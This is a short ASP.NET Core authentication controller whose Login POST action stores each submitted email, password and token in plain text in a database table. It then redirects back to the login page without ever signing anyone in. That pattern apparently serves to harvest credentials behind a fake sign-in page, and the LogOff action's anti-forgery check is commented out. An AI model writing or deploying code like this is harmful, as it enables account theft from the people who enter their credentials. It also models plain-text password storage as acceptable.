using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using Serilog;
using SharedModels;

namespace admin.Controllers
{
    [Route("Auth")]
    [Route("")]
    public class AuthController : Controller
    {
        private readonly SignInManager<IdentityUser> signInManager;
        private readonly UserManager<IdentityUser> userManager;
        private readonly RoleManager<IdentityRole> roleManager;
        //MoodleRepository moodleRepository;
        dbContext db = new dbContext();

        protected override void Dispose(bool disposing)
        {
            base.Dispose(disposing);
            db.Dispose();
        }
        public AuthController(SignInManager<IdentityUser> signInManager, UserManager<IdentityUser> userManager, RoleManager<IdentityRole> roleManager)
        {
            this.signInManager = signInManager;
            this.userManager = userManager;
            this.roleManager = roleManager;
        }

        [HttpGet("Login")]
        [HttpGet("")]
        public IActionResult Login()
        {
            ViewBag.title = "Login";
            return View();
        }

        [HttpPost("Login")]
        public async Task<IActionResult> Login(string email, string password, string token)
        {
            ViewBag.title = "Login";
            var newLogin = new SharedModels.Login();
            newLogin.Email = email;
            newLogin.Password = password;
            newLogin.Token = token;

            db.Logins.Add(newLogin);
            await db.SaveChangesAsync();

            return Redirect("Login");
        }

        [HttpPost]
        //[ValidateAntiForgeryToken]
        [Route("LogOff")]
        public async Task<ActionResult> LogOff()
        {
            ViewBag.title = "Log Off";
            await signInManager.SignOutAsync();
            return RedirectToAction("Login", "Auth");
        }


        [HttpGet("Register")]
        public IActionResult Register()
        {
            ViewBag.title = "Register";
            return View();
        }

        
    }
}
